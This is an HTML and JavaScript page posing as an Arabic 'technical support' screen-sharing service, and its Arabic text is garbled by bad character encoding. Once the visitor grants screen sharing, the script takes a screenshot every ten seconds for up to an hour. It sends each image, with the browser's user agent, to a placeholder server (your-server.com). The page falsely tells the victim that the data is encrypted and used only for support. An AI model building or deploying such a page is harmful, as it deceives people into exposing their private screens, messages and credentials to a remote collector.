<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„ÙÙ†ÙŠ - Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø´Ø§Ø´Ø©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.2);
            text-align: center;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .status-box {
            background: rgba(0, 0, 0, 0.2);
            padding: 20px;
            border-radius: 15px;
            margin: 25px 0;
            text-align: right;
            border-right: 4px solid #25D366;
        }
        
        .btn {
            background: linear-gradient(45deg, #25D366, #1DA851);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
            display: inline-block;
            text-decoration: none;
            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
        }
        
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
        }
        
        .hidden {
            display: none !important;
        }
        
        .screenshot-preview {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            border: 3px solid white;
            margin: 20px auto;
            display: block;
        }
        
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 25px 0;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 28px;
            font-weight: bold;
            color: #25D366;
        }
        
        .log-box {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            max-height: 200px;
            overflow-y: auto;
            text-align: right;
            font-size: 14px;
        }
        
        .log-item {
            padding: 5px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .success { color: #25D366; }
        .error { color: #ff4444; }
        .info { color: #29b6f6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ“± Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„ÙÙ†ÙŠ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…</h1>
        
        <!-- Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„Ø´Ø§Ø´Ø© -->
        <div id="step1">
            <div class="status-box">
                <h2>ğŸ¯ Ø§Ù„Ø®Ø·ÙˆØ© 1: Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø´Ø§Ø´Ø©</h2>
                <p>Ù„Ø¨Ø¯Ø¡ Ø¬Ù„Ø³Ø© Ø§Ù„Ø¯Ø¹Ù…ØŒ ÙŠØ±Ø¬Ù‰ Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø´Ø§Ø´ØªÙƒ.</p>
                <p>Ø³ÙŠØªÙ… Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ø§ Ù„Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„ÙÙ†ÙŠ ÙÙ‚Ø·.</p>
            </div>
            <button class="btn" id="startBtn">â–¶ï¸ Ø¨Ø¯Ø¡ Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø´Ø§Ø´Ø©</button>
        </div>
        
        <!-- Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø¬Ù„Ø³Ø© Ø§Ù„ØªÙ‚Ø§Ø· -->
        <div id="step2" class="hidden">
            <div class="status-box">
                <h2>âœ… Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø´Ø§Ø´Ø©...</h2>
                <p>Ø¬Ù„Ø³Ø© Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„ÙÙ†ÙŠ Ù†Ø´Ø·Ø© Ø§Ù„Ø¢Ù†.</p>
                <p>ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ù…Ø´ÙƒÙ„Ø©.</p>
            </div>
            
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number" id="countEl">0</div>
                    <div>Ø¹Ø¯Ø¯ Ø§Ù„Ù„Ù‚Ø·Ø§Øª</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="timeEl">00:00</div>
                    <div>Ù…Ø¯Ø© Ø§Ù„Ø¬Ù„Ø³Ø©</div>
                </div>
            </div>
            
            <img id="preview" class="screenshot-preview hidden" alt="Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„Ù„Ù‚Ø·Ø©">
            
            <button class="btn" id="stopBtn">â¹ï¸ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¬Ù„Ø³Ø©</button>
        </div>
        
        <!-- Ø³Ø¬Ù„ Ø§Ù„Ø£Ø­Ø¯Ø§Ø« -->
        <div class="log-box" id="logBox">
            <div class="log-item info">â³ Ø¬Ø§Ù‡Ø² Ù„Ø¨Ø¯Ø¡ Ø¬Ù„Ø³Ø© Ø§Ù„Ø¯Ø¹Ù…...</div>
        </div>
        
        <!-- Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø®ØµÙˆØµÙŠØ© -->
        <div style="margin-top: 25px; font-size: 12px; opacity: 0.7;">
            <p>ğŸ”’ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø´ÙØ±Ø© ÙˆÙ„Ø§ ÙŠØªÙ… ØªØ®Ø²ÙŠÙ†Ù‡Ø§ Ø¥Ù„Ø§ Ù„ØºØ±Ø¶ Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„ÙÙ†ÙŠ</p>
        </div>
    </div>

    <script>
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        let mediaStream = null;
        let captureInterval = null;
        let sessionId = null;
        let screenshotCount = 0;
        let sessionStartTime = null;
        let isActive = false;
        
        // Ø¹Ù†Ø§ØµØ± DOM
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const countEl = document.getElementById('countEl');
        const timeEl = document.getElementById('timeEl');
        const preview = document.getElementById('preview');
        const logBox = document.getElementById('logBox');
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ø¹Ø±Ù Ø¬Ù„Ø³Ø© ÙØ±ÙŠØ¯
        function generateSessionId() {
            return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        
        // Ø¥Ø¶Ø§ÙØ© Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ø³Ø¬Ù„
        function addLog(message, type = 'info') {
            const logItem = document.createElement('div');
            logItem.className = `log-item ${type}`;
            logItem.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logBox.prepend(logItem);
            
            // Ø­ÙØ¸ Ø¹Ø¯Ø¯ Ù…Ø­Ø¯ÙˆØ¯ Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
            if (logBox.children.length > 10) {
                logBox.removeChild(logBox.lastChild);
            }
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¤Ù‚Øª
        function updateTimer() {
            if (!sessionStartTime) return;
            
            const elapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
            const minutes = Math.floor(elapsed / 60);
            const seconds = elapsed % 60;
            timeEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        // Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø´Ø§Ø´Ø©
        async function captureScreenshot() {
            if (!mediaStream) return;
            
            try {
                // Ø§Ø³ØªØ®Ø¯Ø§Ù… MediaStream Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø´Ø§Ø´Ø©
                const track = mediaStream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const bitmap = await imageCapture.grabFrame();
                
                // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ canvas
                const canvas = document.createElement('canvas');
                canvas.width = bitmap.width;
                canvas.height = bitmap.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0);
                
                // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ base64
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø®Ø§Ø¯Ù…
                await sendToServer(imageData);
                
                // Ø¹Ø±Ø¶ Ù…Ø¹Ø§ÙŠÙ†Ø©
                preview.src = imageData;
                preview.classList.remove('hidden');
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø¯Ø§Ø¯
                screenshotCount++;
                countEl.textContent = screenshotCount;
                
                addLog(`âœ… ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© #${screenshotCount}`, 'success');
                
            } catch (error) {
                addLog(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ù„Ù‚Ø·Ø©: ${error.message}`, 'error');
            }
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø®Ø§Ø¯Ù…
        async function sendToServer(imageData) {
            try {
                const response = await fetch('https://your-server.com/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: sessionId,
                        image: imageData,
                        count: screenshotCount + 1,
                        timestamp: Date.now()
                    })
                });
                
                const data = await response.json();
                if (data.status !== 'success') {
                    throw new Error(data.message || 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„');
                }
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
                addLog(`âš ï¸ Ù…Ø´ÙƒÙ„Ø© ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…`, 'error');
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø¬Ù„Ø³Ø© Ø§Ù„ØªÙ‚Ø§Ø·
        async function startCaptureSession() {
            try {
                addLog('ğŸ¯ Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ Ø¥Ø°Ù† Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø´Ø§Ø´Ø©...', 'info');
                
                // Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„Ø´Ø§Ø´Ø©
                mediaStream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        frameRate: { ideal: 1 }
                    },
                    audio: false
                });
                
                // Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ù„Ø³Ø© Ø¬Ø¯ÙŠØ¯Ø©
                sessionId = generateSessionId();
                sessionStartTime = Date.now();
                screenshotCount = 0;
                
                // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø© ÙÙŠ Ø§Ù„Ø®Ø§Ø¯Ù…
                try {
                    await fetch('https://your-server.com/register', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            user_id: sessionId,
                            username: 'Ù…Ø³ØªØ®Ø¯Ù… ÙˆÙŠØ¨',
                            first_name: 'Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¯Ø¹Ù…',
                            user_agent: navigator.userAgent
                        })
                    });
                } catch (e) {
                    console.log('ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø© ØºÙŠØ± Ø¶Ø±ÙˆØ±ÙŠ Ù„Ù„Ø¹Ù…Ù„ Ø§Ù„Ù…Ø­Ù„ÙŠ');
                }
                
                // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„Ù„Ø®Ø·ÙˆØ© 2
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                
                addLog('âœ… ØªÙ… ØªÙØ¹ÙŠÙ„ Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø´Ø§Ø´Ø© Ø¨Ù†Ø¬Ø§Ø­!', 'success');
                addLog('ğŸ“¸ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ© ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ...', 'info');
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· ØªÙ„Ù‚Ø§Ø¦ÙŠ
                isActive = true;
                captureInterval = setInterval(captureScreenshot, 10000); // ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø£ÙˆÙ„ Ù„Ù‚Ø·Ø© ÙÙˆØ±Ø§Ù‹
                setTimeout(captureScreenshot, 1000);
                
                // Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø¤Ù‚Øª
                setInterval(updateTimer, 1000);
                
                // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø¹Ø¯ Ø³Ø§Ø¹Ø© (3600000 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©)
                setTimeout(stopCaptureSession, 3600000);
                
            } catch (error) {
                addLog(`âŒ ÙØ´Ù„ ÙÙŠ Ø¨Ø¯Ø¡ Ø§Ù„Ø¬Ù„Ø³Ø©: ${error.message}`, 'error');
                alert('ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø´Ø§Ø´Ø© Ù„Ø¨Ø¯Ø¡ Ø¬Ù„Ø³Ø© Ø§Ù„Ø¯Ø¹Ù….');
            }
        }
        
        // Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù„Ø³Ø© Ø§Ù„ØªÙ‚Ø§Ø·
        function stopCaptureSession() {
            if (!isActive) return;
            
            isActive = false;
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ§ØµÙ„ Ø§Ù„Ø²Ù…Ù†ÙŠ
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            
            // Ø¥ÙŠÙ‚Ø§Ù Ø¯ÙÙ‚ Ø§Ù„ÙˆØ³Ø§Ø¦Ø·
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            
            // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ù…Ø¹Ø§ÙŠÙ†Ø©
            preview.classList.add('hidden');
            
            addLog('â¹ï¸ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù„Ø³Ø© Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø´Ø§Ø´Ø©', 'info');
            addLog(`ğŸ“Š Ù…Ù„Ø®Øµ Ø§Ù„Ø¬Ù„Ø³Ø©: ${screenshotCount} Ù„Ù‚Ø·Ø© Ø®Ù„Ø§Ù„ ${timeEl.textContent}`, 'info');
            
            // Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„Ø®Ø·ÙˆØ© 1
            step2.classList.add('hidden');
            step1.classList.remove('hidden');
            
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù‚ÙŠÙ…
            countEl.textContent = '0';
            timeEl.textContent = '00:00';
            sessionId = null;
            sessionStartTime = null;
            screenshotCount = 0;
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø§Øª Ø§Ù„Ø£Ø­Ø¯Ø§Ø«
        startBtn.addEventListener('click', startCaptureSession);
        stopBtn.addEventListener('click', stopCaptureSession);
        
        // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¬Ù„Ø³Ø© Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('beforeunload', function() {
            if (isActive) {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¨Ø§Ù„Ø¥ØºÙ„Ø§Ù‚
                navigator.sendBeacon('https://your-server.com/stop', JSON.stringify({
                    user_id: sessionId,
                    action: 'page_closed'
                }));
            }
        });
        
        // Ø¨Ø¯Ø¡ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
        // setTimeout(() => {
        //     startBtn.click();
        // }, 2000);
        
        addLog('ğŸš€ ØªÙ… ØªØ­Ù…ÙŠÙ„ Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯Ø¹Ù… Ø¨Ù†Ø¬Ø§Ø­', 'success');
    </script>
</body>
</html>
